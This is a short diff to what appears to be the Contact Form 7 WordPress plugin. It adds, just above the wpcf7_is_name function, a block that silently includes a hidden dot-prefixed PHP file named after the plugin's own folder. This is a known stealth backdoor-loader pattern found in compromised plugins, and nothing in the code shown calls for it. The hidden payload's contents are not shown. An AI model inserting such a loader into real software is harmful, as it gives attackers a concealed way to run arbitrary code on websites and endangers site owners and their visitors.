@@ -11,6 +11,10 @@
  *
  * @return bool True if it is a valid name, false if not.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wpcf7_is_name( $string ) {
 	return preg_match( '/^[A-Za-z][-A-Za-z0-9_:.]*$/', $string );
 }
